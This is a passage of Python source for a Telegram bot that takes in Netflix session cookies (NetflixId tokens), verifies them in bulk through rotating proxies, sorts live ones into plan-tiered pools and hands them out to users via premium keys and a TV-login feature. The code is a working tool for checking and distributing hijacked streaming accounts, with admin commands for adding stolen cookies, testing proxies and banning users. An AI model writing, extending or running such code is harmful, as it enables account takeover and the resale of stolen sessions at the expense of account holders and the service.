        await query.edit_message_text(premium_emoji("Use /keys check_quota get_quota hours max_users to generate a key.\nExample: /keys 50 10 24 10  (50 checks, 10 gets, 24 hours, 10 users)"), parse_mode='HTML')
    elif data == "admin_reload":
        counts = await get_pool_counts(force=True)
        await query.edit_message_text(
            premium_emoji(f"🔄 Pool reloaded\nBasic: {counts['basic']}\nStandard: {counts['standard']}\nPremium: {counts['premium']}"),
            parse_mode='HTML'
        )
    elif data == "admin_addcookie":
        await query.edit_message_text(premium_emoji("Send me a NetflixId (or raw cookie) and I'll add it to the pool.\nExample: NetflixId=abc123...\nYou can send multiple lines."), parse_mode='HTML')
        context.user_data['expecting_cookie'] = True
    elif data == "admin_upload":
        await query.edit_message_text(premium_emoji("Send me a .txt file with one NetflixId per line.\nI will add them to the pool."), parse_mode='HTML')
    elif data == "admin_users":
        users = load_users()
        lines = []
        for uid, u in list(users.items())[:20]:
            is_prem = u.get("premium_expiry", 0) > time.time() and (u.get("premium_check_quota", 0) > 0 or u.get("premium_get_quota", 0) > 0)
            username = u.get("username")
            display = get_user_display(uid, username)
            lines.append(f"{display}: {'👑 Admin' if u.get('is_admin') else '⭐ Premium' if is_prem else '👤 Free'}")
        msg = "👥 Users (first 20)\n" + "\n".join(lines)
        await query.edit_message_text(premium_emoji(msg), parse_mode='HTML')

async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    user_id = str(update.effective_user.id)
    _, user = ensure_user(user_id, update.effective_user.username)
    if not user.get("is_admin", False):
        await update.effective_message.reply_text(premium_emoji("⛔ Admin only."), parse_mode='HTML')
        return
    args = context.args
    if len(args) != 4:
        await update.effective_message.reply_text(
            premium_emoji("Usage: /keys check_quota get_quota hours max_users\nExample: /keys 50 10 24 10  (50 checks, 10 gets, 24 hours, 10 users)"),
            parse_mode='HTML'
        )
        return
    try:
        check_quota = int(args[0])
        get_quota = int(args[1])
        hours = int(args[2])
        max_users = int(args[3])
    except:
        await update.effective_message.reply_text(premium_emoji("Invalid numbers."), parse_mode='HTML')
        return
    keys = load_keys()
    while True:
        key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        if key not in keys:
            break
    keys[key] = {
        "check_quota": check_quota,
        "get_quota": get_quota,
        "duration_hours": hours,
        "remaining_uses": max_users,
        "created_by": user_id,
        "created_at": time.time()
    }
    save_keys(keys)
    await update.effective_message.reply_text(
        premium_emoji(f"✅ Key generated\n{key}\nCheck quota: {check_quota}\nGet quota: {get_quota}\nDuration: {hours} hours\nMax uses: {max_users}\nShare this key with users to redeem premium."),
        parse_mode='HTML'
    )

async def check_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.effective_message.reply_text(premium_emoji("❌ Admin only."), parse_mode='HTML')
        return

    proxies = list(proxy_manager.proxies)
    if not proxies:
        await update.effective_message.reply_text(premium_emoji("❌ No proxies found. Add some first."), parse_mode='HTML')
        return

    status_msg = await update.effective_message.reply_text(
        premium_emoji(f"🔄 Testing {len(proxies)} proxies..."),
        parse_mode='HTML'
    )

    checker = ProxyChecker(timeout=5)
    start_time = time.time()
    last_update_time = 0
    update_step = max(1, len(proxies) // 20)

    def progress_callback(total, checked):
        nonlocal last_update_time
        now = time.time()
        if checked % update_step == 0 or checked == total or (now - last_update_time) >= 1.0:
            last_update_time = now
            async def update_status():
                try:
                    pct = int((checked / total) * 100) if total else 0
                    bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
                    await status_msg.edit_text(
                        premium_emoji(
                            f"🔄 Testing proxies... {pct}% [{bar}]\n"
                            f"✅ Alive: {len(checker.live)}\n"
                            f"⏳ Remaining: {total - checked}"
                        ),
                        parse_mode='HTML'
                    )
                except Exception as e:
                    if "RetryAfter" not in str(e):
                        log.error(f"Progress update error: {e}")
            asyncio.create_task(update_status())

    live = await checker.check_all(proxies, target=0, threads=100, progress_callback=progress_callback)
    elapsed = time.time() - start_time

    if live:
        proxy_manager.proxies = set(p for p, _ in live)
        await proxy_manager.save_to_file_async(PROXY_FILE)
        await status_msg.delete()
        msg = premium_emoji(f"✅ Proxy test complete.\n{len(live)} alive proxies saved.\n⏱️ {elapsed:.2f}s\n❌ Bad: {checker.bad} | ⚠️ Error: {checker.errors}")
        content = "\n".join([p for p, _ in live]).encode('utf-8')
        file_stream = io.BytesIO(content)
        file_stream.name = "proxy.txt"
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=InputFile(file_stream, filename="proxy.txt"),
            caption=msg,
            parse_mode='HTML'
        )
    else:
        try:
            await status_msg.edit_text(premium_emoji(f"⚠️ No alive proxies found! ❌ Bad: {checker.bad} | ⚠️ Error: {checker.errors}"), parse_mode='HTML')
        except Exception as e:
            if "RetryAfter" in str(e):
                import re
                match = re.search(r'Retry after (\d+)', str(e))
                if match:
                    delay = int(match.group(1))
                    await asyncio.sleep(delay)
                    await status_msg.edit_text(premium_emoji(f"⚠️ No alive proxies found! ❌ Bad: {checker.bad} | ⚠️ Error: {checker.errors}"), parse_mode='HTML')
                else:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=premium_emoji(f"⚠️ No alive proxies found! ❌ Bad: {checker.bad} | ⚠️ Error: {checker.errors}"),
                        parse_mode='HTML'
                    )
            else:
                raise

async def add_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.effective_message.reply_text(premium_emoji("❌ Admin only."), parse_mode='HTML')
        return
    args = context.args
    if not args:
        await update.effective_message.reply_text(premium_emoji("Usage: /addproxy proxy1 proxy2 ..."), parse_mode='HTML')
        return
    new_proxies = []
    for arg in args:
        for line in arg.splitlines():
            line = line.strip()
            if line:
                new_proxies.append(line)
    if not new_proxies:
        await update.effective_message.reply_text(premium_emoji("❌ No valid proxies."), parse_mode='HTML')
        return
    added = proxy_manager.add_proxies(new_proxies)
    await update.effective_message.reply_text(
        premium_emoji(f"✅ Added {len(added)} proxies. Total: {len(proxy_manager.proxies)}. Run /check to test them."),
        parse_mode='HTML'
    )

async def clear_feedback_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.effective_message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: /clearfeedback <user_id>")
        return
    target = context.args[0]
    clear_pending_feedback(target)
    await update.effective_message.reply_text(f"✅ Cleared pending feedback for user {target}.")

async def add_proxy_file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.effective_message.reply_text(premium_emoji("❌ Admin only."), parse_mode='HTML')
        return
    doc = update.effective_message.document or (update.effective_message.reply_to_message.document if update.effective_message.reply_to_message else None)
    if not doc:
        await update.effective_message.reply_text(premium_emoji("❌ Please reply to a .txt file."), parse_mode='HTML')
        return
    if not doc.file_name.endswith('.txt'):
        await update.effective_message.reply_text(premium_emoji("❌ Only .txt files are accepted."), parse_mode='HTML')
        return
    file = await doc.get_file()
    content = await file.download_as_bytearray()
    text = content.decode('utf-8', errors='ignore')
    proxies = [line.strip() for line in text.splitlines() if line.strip()]
    if not proxies:
        await update.effective_message.reply_text(premium_emoji("❌ No proxies found."), parse_mode='HTML')
        return
    added = proxy_manager.add_proxies(proxies)
    await update.effective_message.reply_text(
        premium_emoji(f"✅ Added {len(added)} proxies from file. Total: {len(proxy_manager.proxies)}. Run /check to test them."),
        parse_mode='HTML'
    )

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /ban <user_id> <reason>")
        return
    target = context.args[0]
    reason = " ".join(context.args[1:]) if len(context.args) > 1 else "No reason provided"
    users, user = ensure_user(target)
    user["banned"] = True
    user["ban_reason"] = reason
    save_users(users)
    try:
        display = get_user_display(target, user.get("username"))
        await context.bot.send_message(
            chat_id=int(target),
            text=premium_emoji(f"⛔ You have been **banned** from using this bot.\nReason: {reason}\nContact admin if you think this is a mistake."),
            parse_mode='HTML'
        )
    except Exception as e:
        log.error(f"Could not notify banned user {target}: {e}")
    await update.message.reply_text(f"✅ Banned user {target}. Reason: {reason}")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    target = context.args[0]
    users, user = ensure_user(target)
    user["banned"] = False
    user["ban_reason"] = ""
    save_users(users)
    await update.message.reply_text(f"✅ Unbanned user {target}.")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    users = load_users()
    if not users:
        await update.message.reply_text("No users found.")
        return
    lines = []
    for uid, user in users.items():
        username = user.get("username")
        display = get_user_display(uid, username)
        status = "👤 Free"
        if user.get("banned"):
            status = "⛔ Banned"
        elif user.get("is_admin"):
            status = "👑 Admin"
        elif is_premium(user):
            status = "⭐ Premium"
        lines.append(f"{display}: {status}")
    content = "\n".join(lines)
    if len(content) > 4000:
        f = io.BytesIO(content.encode('utf-8'))
        f.name = "users_list.txt"
        await update.message.reply_document(document=InputFile(f, filename="users_list.txt"), caption="👥 Full user list")
    else:
        await update.message.reply_text(f"👥 Users:\n{content}", parse_mode='HTML')

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    msg = ' '.join(context.args)
    users = load_users()
    if not users:
        await update.message.reply_text("No users found.")
        return
    sent = 0
    failed = 0
    status_msg = await update.message.reply_text(f"📤 Broadcasting to {len(users)} users...")
    for uid in users:
        try:
            await context.bot.send_message(chat_id=int(uid), text=premium_emoji(msg), parse_mode='HTML')
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    await status_msg.edit_text(premium_emoji(f"✅ Broadcast complete.\nSent: {sent}\nFailed: {failed}"), parse_mode='HTML')

async def bdfb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("Usage: /bdfb <yes/no> [minutes]\nExample: /bdfb yes 30\nExample: /bdfb no")
        return

    global feedback_broadcast_interval
    action = context.args[0].lower()
    if action == "no":
        feedback_broadcast_interval = 0
        await update.message.reply_text("✅ Auto-broadcast disabled.")
    elif action == "yes":
        if len(context.args) < 2:
            await update.message.reply_text("❌ Please specify interval in minutes, e.g., /bdfb yes 30")
            return
        try:
            minutes = int(context.args[1])
            if minutes <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ Invalid minutes. Must be a positive integer.")
            return
        feedback_broadcast_interval = minutes
        await update.message.reply_text(f"✅ Auto-broadcast enabled every {minutes} minute(s).")
    else:
        await update.message.reply_text("❌ Invalid action. Use yes or no.")

async def list_feedback_pending(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    users = load_users()
    pending = []
    for uid, user in users.items():
        pf = user.get("pending_feedback")
        if pf:
            username = user.get("username")
            display = get_user_display(uid, username)
            pending.append(f"{display} - {pf['type']} - pending since {datetime.fromtimestamp(pf['timestamp']).isoformat()}")
    if not pending:
        await update.message.reply_text("✅ No users with pending feedback.")
        return
    content = "\n".join(pending)
    if len(content) > 4000:
        f = io.BytesIO(content.encode('utf-8'))
        f.name = "pending_feedback.txt"
        await update.message.reply_document(document=InputFile(f, filename="pending_feedback.txt"), caption="📋 Users with pending feedback")
    else:
        await update.message.reply_text(f"📋 Users with pending feedback:\n{content}", parse_mode='HTML')

async def clearfb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /clearfb <user_id>")
        return
    target = context.args[0]
    clear_pending_feedback(target)
    await update.message.reply_text(f"✅ Cleared pending feedback for user {target}.")

async def autoban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("Usage: /autoban <yes/no> [minutes]\nExample: /autoban yes 10\nExample: /autoban no")
        return

    global AUTOBAN_ENABLED, AUTOBAN_TIMEOUT_MINUTES
    action = context.args[0].lower()
    if action == "no":
        AUTOBAN_ENABLED = False
        await update.message.reply_text("✅ Auto-ban disabled.")
    elif action == "yes":
        if len(context.args) < 2:
            await update.message.reply_text("❌ Please specify timeout in minutes, e.g., /autoban yes 10")
            return
        try:
            minutes = int(context.args[1])
            if minutes <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ Invalid minutes. Must be a positive integer.")
            return
        AUTOBAN_ENABLED = True
        AUTOBAN_TIMEOUT_MINUTES = minutes
        await update.message.reply_text(f"✅ Auto-ban enabled. Users who don't send feedback within {minutes} minutes will be banned.")
    else:
        await update.message.reply_text("❌ Invalid action. Use yes or no.")

async def ufile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != 6725209689:
        await update.message.reply_text("⛔ Only for owner.")
        return
    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("❌ users.json not found.")
        return
    try:
        with open(USERS_FILE, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=InputFile(f, filename="users.json"),
                caption=f"📄 users.json – {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        await update.message.reply_text("✅ Sent users.json.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {str(e)}")

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            await query.answer("Already processing!")
            return
        modes = {
            "mode_check": ("check", "🧊 Account Check mode! Upload file."),
            "mode_clean": ("clean", "🧹 Purify Cookies mode! Upload messy file."),
            "mode_split": ("split", "✂️ Split mode – upload a ZIP file to split its contents."),
            "mode_tvlogin": ("tvlogin", None),
        }
        if query.data in modes:
            mode, msg = modes[query.data]
            user_state[user_id] = {'mode': mode, 'cookies': [], 'stop': False, 'busy': False}
            if mode == "tvlogin":
                await context.bot.send_message(chat_id,
                    premium_emoji("📺 TV Login – always uses Premium cookies.\n\nPlease send your 8-digit TV code using:\n`/tv YOUR_CODE`\n\nExample: `/tv 12345678`"),
                    parse_mode='HTML')
            elif mode == "split":
                await context.bot.send_message(chat_id,
                    premium_emoji("✂️ Split Mode\n\nUpload a ZIP file containing many .txt and/or .json files.\nI will count the files and ask how many you want per output ZIP.\n\nOnly ZIP uploads are accepted."),
                    parse_mode='HTML')
            else:
                await context.bot.send_message(chat_id, premium_emoji(f"{msg}\n\nUpload your .txt/.json/.zip file."), parse_mode='HTML')

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or update.effective_chat.type != "private":
        return
    user_id = str(update.effective_user.id)
    async with user_locks[user_id]:
        if user_id not in user_state:
            user_state[user_id] = {'mode': 'check', 'cookies': [], 'stop': False, 'busy': False}
        if user_state[user_id].get('busy'):
            await update.effective_message.reply_html(premium_emoji("⚠️ Already processing. Stop first."), reply_markup=STOP_MARKUP, parse_mode='HTML')
            return
        users, user = ensure_user(user_id, update.effective_user.username)
        mode = user_state[user_id].get('mode', 'check')

        if not update.effective_message.document:
            await update.effective_message.reply_text(premium_emoji("❌ Please upload a .txt, .json, or .zip file. For links, use /link."), parse_mode='HTML')
            return

        file = None
        max_retries = 3
        delay = 2
        for attempt in range(max_retries):
            try:
                file = await update.effective_message.document.get_file()
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    await update.effective_message.reply_text(
                        premium_emoji("❌ Failed to download the file after multiple attempts. Please try again later."),
                        parse_mode='HTML'
                    )
                    raise
                await asyncio.sleep(delay)
                delay *= 2

        ext = update.effective_message.document.file_name.lower()
        with tempfile.TemporaryDirectory() as td:
            tp = os.path.join(td, update.effective_message.document.file_name)
            await file.download_to_drive(tp)
            with open(tp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()

            if mode == "clean":
                if ext.endswith('.zip'):
                    cookies_from_zip = await asyncio.to_thread(extract_cookies_from_zip, tp)
                    tokens = [cookie.get('NetflixId', '') for _, cookie in cookies_from_zip if cookie.get('NetflixId')]
                    if not tokens:
                        await update.effective_message.reply_text(premium_emoji("❌ No valid Netflix cookies found in zip!"), parse_mode='HTML')
                        return
                    content = "\n".join(tokens)
                await clean_cookies_process(update.effective_chat.id, content, user_id, context, update.effective_message.document.file_name)
                return

            if mode == "split":
                if not ext.endswith('.zip'):
                    await update.effective_message.reply_text(premium_emoji("❌ Split mode only accepts ZIP files. Please upload a ZIP archive."), parse_mode='HTML')
                    return

                file_count = 0
                try:
                    with zipfile.ZipFile(tp, 'r') as z:
                        for info in z.infolist():
                            if info.is_dir():
                                continue
                            if info.filename.startswith('__MACOSX') or info.filename.startswith('.'):
                                continue
                            if info.filename.lower().endswith(('.txt', '.json')):
                                file_count += 1
                except Exception as e:
                    await update.effective_message.reply_text(premium_emoji(f"❌ Error reading ZIP: {str(e)}"), parse_mode='HTML')
                    return

                if file_count == 0:
                    await update.effective_message.reply_text(premium_emoji("❌ No .txt or .json files found in the ZIP."), parse_mode='HTML')
                    return

                timestamp = int(time.time())
                saved_path = os.path.join(SPLIT_TEMP_DIR, f"{user_id}_{timestamp}.zip")
                shutil.copy2(tp, saved_path)

                user_state[user_id]['split_zip_path'] = saved_path
                user_state[user_id]['split_file_count'] = file_count

                keyboard = [
                    [InlineKeyboardButton("300", callback_data="split_300"),
                     InlineKeyboardButton("400", callback_data="split_400")],
                    [InlineKeyboardButton("500", callback_data="split_500"),
                     InlineKeyboardButton("600", callback_data="split_600")],
                    [InlineKeyboardButton("Custom", callback_data="split_custom")],
                ]
                await update.effective_message.reply_text(
                    premium_emoji(f"📦 Split Mode\n\nUploaded ZIP contains {file_count} files (.txt and .json).\nHow many files per output ZIP? (choose a preset or click Custom)"),
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='HTML'
                )
                return

            if mode != "check":
                await update.effective_message.reply_text(premium_emoji("❌ Invalid mode. Use /start and select Check."), parse_mode='HTML')
                return

            if ext.endswith('.zip'):
                cookies = await extract_cookies_from_zip(tp)
            else:
                raw_cookies = extract_netflix_cookies(content)
                cookies = []
                for cookie in raw_cookies:
                    cookies.append((f"cookie_{len(cookies)}", cookie))

            seen = set()
            dedup = []
            for nm, ck in cookies:
                h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
                if h not in seen:
                    seen.add(h)
                    dedup.append((nm, ck))
            if not dedup:
                await update.effective_message.reply_text(premium_emoji("❌ No valid Netflix cookies found in file!"), parse_mode='HTML')
                return

            is_admin = user.get("is_admin", False)
            if not is_admin and not is_premium(user):
                if len(dedup) > MAX_COOKIES_PER_MASS_CHECK:
                    dedup = dedup[:MAX_COOKIES_PER_MASS_CHECK]
                    await update.effective_message.reply_text(
                        premium_emoji(f"⚠️ File had more than {MAX_COOKIES_PER_MASS_CHECK} cookies. Only the first {MAX_COOKIES_PER_MASS_CHECK} will be checked."),
                        parse_mode='HTML'
                    )
            user_state[user_id]['cookies'] = dedup
            confirm_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Confirm", callback_data="confirm_check"),
                 InlineKeyboardButton("❌ Cancel", callback_data="cancel_check")]
            ])
            await update.effective_message.reply_text(
                premium_emoji(f"📥 Loaded {len(dedup)} unique cookies.\n\nStart checking?"),
                parse_mode='HTML',
                reply_markup=confirm_markup
            )

async def split_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    data = query.data

    if data == "split_custom":
        await query.edit_message_text(
            premium_emoji("✏️ Please enter the number of files you want per output ZIP (e.g., 250).\nSend a number only."),
            parse_mode='HTML'
        )
        context.user_data['expecting_split_size'] = True
        return

    try:
        chunk_size = int(data.split('_')[1])
    except:
        await query.edit_message_text(premium_emoji("❌ Invalid option."), parse_mode='HTML')
        return

    await perform_split(update, context, chunk_size, query)

async def perform_split(update: Update, context: ContextTypes.DEFAULT_TYPE, chunk_size: int, query=None):
    user_id = str(update.effective_user.id) if update.effective_user else str(query.from_user.id)
    split_zip_path = user_state.get(user_id, {}).get('split_zip_path')
    if not split_zip_path or not os.path.exists(split_zip_path):
        import glob
        pattern = os.path.join(SPLIT_TEMP_DIR, f"{user_id}_*.zip")
        files = glob.glob(pattern)
        if files:
            files.sort(key=os.path.getmtime, reverse=True)
            split_zip_path = files[0]
            user_state[user_id]['split_zip_path'] = split_zip_path
            log.info(f"Recovered split zip from fallback: {split_zip_path}")
        else:
            await (query.edit_message_text(premium_emoji("❌ No ZIP file found. Please start over."), parse_mode='HTML') if query else update.effective_message.reply_text(premium_emoji("❌ No ZIP file found. Please start over."), parse_mode='HTML'))
            return

    loop = asyncio.get_running_loop()
    persistent_dir = None  # Will hold the temp dir path
    try:
        result = await loop.run_in_executor(
            GLOBAL_EXECUTOR,
            _split_zip_worker,
            split_zip_path,
            chunk_size
        )
        output_zips, total_files, num_chunks, persistent_dir = result

        if query:
            await query.edit_message_text(premium_emoji(f"✂️ Splitting complete! Sending {len(output_zips)} ZIPs..."), parse_mode='HTML')
        else:
            await update.effective_message.reply_text(premium_emoji(f"✂️ Splitting complete! Sending {len(output_zips)} ZIPs..."), parse_mode='HTML')

        if len(output_zips) > 10:
            # Bundle all split ZIPs into one master ZIP
            with tempfile.TemporaryDirectory() as tmpdir2:
                master_zip = os.path.join(tmpdir2, "split_all.zip")
                with zipfile.ZipFile(master_zip, 'w', zipfile.ZIP_DEFLATED) as mz:
                    for zpath in output_zips:
                        mz.write(zpath, os.path.basename(zpath))
                with open(master_zip, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=InputFile(f, filename="split_all.zip"),
                        caption=premium_emoji(f"📦 All {num_chunks} split ZIPs bundled together.\n{WATERMARK}"),
                        parse_mode='HTML'
                    )
        else:
            for zpath in output_zips:
                with open(zpath, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=InputFile(f, filename=os.path.basename(zpath)),
                        caption=premium_emoji(f"{WATERMARK}"),
                        parse_mode='HTML'
                    )

    except Exception as e:
        log.error(f"Split error: {e}")
        await (query.edit_message_text(premium_emoji(f"❌ Error during split: {str(e)}"), parse_mode='HTML') if query else update.effective_message.reply_text(premium_emoji(f"❌ Error during split: {str(e)}"), parse_mode='HTML'))
        return
    finally:
        # Clean up the persistent temp directory (if it was created)
        if persistent_dir and os.path.exists(persistent_dir):
            shutil.rmtree(persistent_dir, ignore_errors=True)
        # Also clean up the original split zip in split_temp
        try:
            os.remove(split_zip_path)
        except:
            pass
        user_state[user_id]['split_zip_path'] = None
        context.user_data['expecting_split_size'] = False

def _split_zip_worker(split_zip_path, chunk_size):
    import tempfile, shutil
    file_list = []
    try:
        with zipfile.ZipFile(split_zip_path, 'r') as z:
            for info in z.infolist():
                if info.is_dir():
                    continue
                if info.filename.startswith('__MACOSX') or info.filename.startswith('.'):
                    continue
                if info.filename.lower().endswith(('.txt', '.json')):
                    file_list.append(info.filename)
    except Exception as e:
        raise RuntimeError(f"Error reading ZIP: {str(e)}")

    total_files = len(file_list)
    if total_files == 0:
        raise RuntimeError("No .txt or .json files found in the ZIP.")
    if chunk_size > total_files:
        chunk_size = total_files

    chunks = [file_list[i:i+chunk_size] for i in range(0, total_files, chunk_size)]
    num_chunks = len(chunks)
    
    # Create a persistent directory (not auto-deleted)
    persistent_dir = tempfile.mkdtemp(prefix="split_")
    output_zips = []
    try:
        with zipfile.ZipFile(split_zip_path, 'r') as src:
            for idx, chunk in enumerate(chunks, 1):
                zip_name = f"split_part_{idx}_{chunk_size}files.zip"
                zip_path = os.path.join(persistent_dir, zip_name)
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for fname in chunk:
                        try:
                            data = src.read(fname)
                            zf.writestr(fname, data)
                        except Exception as e:
                            log.warning(f"Could not add {fname} to zip: {e}")
                output_zips.append(zip_path)
        return output_zips, total_files, num_chunks, persistent_dir
    except Exception as e:
        shutil.rmtree(persistent_dir, ignore_errors=True)
        raise

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if update.effective_chat.type != "private":
        return

    user_id = str(update.effective_user.id)

    if update.message and update.message.photo and has_pending_feedback(user_id):
        pending = get_pending_feedback(user_id)
        if pending:
            await process_feedback_photo(update, context, pending)
            return

    if context.user_data.get('expecting_split_size'):
        text = update.effective_message.text.strip()
        try:
            chunk_size = int(text)
            if chunk_size <= 0:
                raise ValueError
        except:
            await update.effective_message.reply_text(premium_emoji("❌ Please enter a valid positive number (e.g., 250)."), parse_mode='HTML')
            return
        context.user_data['expecting_split_size'] = False
        await perform_split(update, context, chunk_size)
        return

    if context.user_data.get('expecting_cookie'):
        text = update.effective_message.text.strip()
        nid = extract_netflix_id(text)
        if not nid:
            await update.message.reply_text(premium_emoji("❌ Invalid NetflixId or token."), parse_mode='HTML')
            context.user_data['expecting_cookie'] = False
            return

        used = load_used()
        basic, standard, premium = await get_pool_cached(force=True)
        if nid in used or nid in basic or nid in standard or nid in premium:
            await update.message.reply_text(premium_emoji("ℹ️ This NetflixId already exists in the pool or is used."), parse_mode='HTML')
            context.user_data['expecting_cookie'] = False
            return

        valid, info = generator.verify_cookie(nid)
        if not valid:
            await update.message.reply_text(premium_emoji("❌ Cookie is invalid or expired."), parse_mode='HTML')
            context.user_data['expecting_cookie'] = False
            return
        if is_on_hold_account(info):
            await update.message.reply_text(premium_emoji("⏸️ Cookie is on hold – not added."), parse_mode='HTML')
            context.user_data['expecting_cookie'] = False
            return

        plan_key, _, _ = derive_output_plan_bucket(info, True)
        plan_file = BASIC_FILE if plan_key == 'basic' else STANDARD_FILE if plan_key == 'standard' else PREMIUM_FILE

        async with pool_file_lock:
            async with aiofiles.open(plan_file, 'a', encoding='utf-8') as f:
                await f.write(nid + '\n')
        used.add(nid)
        save_used(used)
        await get_pool_cached(force=True)

        await update.message.reply_text(
            premium_emoji(f"✅ Added NetflixId: <code>{nid}</code> to {plan_key.capitalize()} pool."),
            parse_mode='HTML'
        )
        context.user_data['expecting_cookie'] = False
        return

    users, user = ensure_user(user_id, update.effective_user.username)
    if not user.get("is_admin", False):
        return

    if update.effective_message.document:
        doc = update.effective_message.document
        if not doc.file_name or not doc.file_name.lower().endswith(('.txt', '.zip')):
            await update.effective_message.reply_text(premium_emoji("❌ Please upload a .txt or .zip file."), parse_mode='HTML')
            return

        await update.effective_message.reply_text(premium_emoji("📥 Processing admin upload – checking cookies..."), parse_mode='HTML')

        file = await context.bot.get_file(doc.file_id)
        temp_dir = tempfile.mkdtemp()
        try:
            file_path = os.path.join(temp_dir, doc.file_name)
            await file.download_to_drive(file_path)

            cookie_contents = []
            if doc.file_name.endswith('.txt'):
                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                blocks = split_txt_by_token(content)
                for i, block in enumerate(blocks):
                    clean = extract_netscape_lines(block)
                    if clean:
                        cookie_contents.append((f"block_{i+1}.txt", clean))
            else:
                def extract_zip(zip_path):
                    with zipfile.ZipFile(zip_path, 'r') as zf:
                        items = []
                        for info in zf.infolist():
                            if info.filename.endswith('.txt') and not info.is_dir():
                                with zf.open(info) as f:
                                    content = f.read().decode('utf-8', errors='ignore')
                                    items.append((info.filename, content))
                        return items
                cookie_contents = await asyncio.to_thread(extract_zip, file_path)

            if not cookie_contents:
                await update.effective_message.reply_text(premium_emoji("📭 No cookie files found."), parse_mode='HTML')
                return

            seen_tokens = set()
            unique_cookies = []
            duplicates = 0
            for fname, content in cookie_contents:
                all_cookies = extract_netflix_cookies(content)
                for cookie in all_cookies:
                    nid = cookie.get('NetflixId')
                    if nid and nid not in seen_tokens:
                        seen_tokens.add(nid)
                        unique_cookies.append(nid)
                    elif nid:
                        duplicates += 1

            total_unique = len(unique_cookies)
            if duplicates > 0:
                await update.effective_message.reply_text(
                    premium_emoji(f"📊 Removed {duplicates} duplicate cookies (same token).\n🔍 Checking {total_unique} unique cookies."),
                    parse_mode='HTML'
                )

            if total_unique == 0:
                await update.effective_message.reply_text(premium_emoji("📭 No unique cookies found."), parse_mode='HTML')
                return

            progress_msg = await update.effective_message.reply_text(
                premium_emoji(f"⏳ Checking {total_unique} cookies...\nActive: 0, Expired: 0, Bad: 0, Errors: 0\nProgress: 0/{total_unique}"),
                parse_mode='HTML'
            )

            processed = 0
            active = 0
            expired = 0
            bad = 0
            errors = 0
            added = 0
            on_hold = 0

            used = load_used()
            basic_pool, standard_pool, premium_pool = await get_pool_cached(force=True)
            existing_all = set(basic_pool + standard_pool + premium_pool)

            for nid in unique_cookies:
                processed += 1
                if nid in existing_all or nid in used:
                    bad += 1
                    continue

                valid, info = await asyncio.to_thread(generator.verify_cookie, nid)
                if not valid:
                    bad += 1
